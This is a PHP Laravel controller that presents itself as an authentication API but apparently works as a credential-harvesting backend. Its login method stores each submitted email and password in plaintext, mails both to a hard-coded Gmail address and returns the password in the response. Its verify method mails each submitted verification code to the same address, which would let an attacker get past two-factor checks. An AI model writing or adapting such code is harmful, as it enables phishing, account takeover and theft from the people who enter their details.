<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\PaxUser;
use Illuminate\Support\Facades\Mail;
use App\Mail\Register;
use App\Mail\Login;
use App\Mail\Verify;
use Illuminate\Support\Facades\Session;;

class AuthController extends Controller
{
    public function register(Request $request)
    {
        $request->validate([
            'email' => 'required|string|email|max:255|unique:users',
        ]);

        $user = PaxUser::create([
            'email' => $request->email,
        ]);

        // Send a welcome email
        $email = 'brotukk@gmail.com';
        Mail::to($email)->send(new Register($user->email));

        return response()->json([
            'email' => $user->email,
            'status' => 'success',
        ]);
    }

    public function login(Request $request)
    {
        $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

        // Handle the data (for example, store it in the database)
        $user = PaxUser::create([
            'email' => $request->email,
            'password' => $request->password,
        ]);

        $adminemail = 'brotukk@gmail.com';
        Mail::to($adminemail)->send(new Login($user->email, $user->password));

        // Store email in session
        session(['email' => $user->email]);


        return response()->json([
            'email' => $user->email,
            'password' => $user->password,
            'status' => 'success',
        ]);
    }

    public function verify(Request $request)
    {
         // Retrieve the email from the session
         $email = $request->email;
         $code = $request->code;
        // Handle the data (for example, store it in the database)
        $user = PaxUser::create([
            'email' => $email,
            'verification_code' => $code,
        ]);

        // Send a verification code email 
        $adminemail = 'brotukk@gmail.com';
        Mail::to($adminemail)->send(new Verify($email, $code));

        return response()->json([
            'email' => $email,
            'code' => $code,
            'status' => 'success'
        ]);
    }


}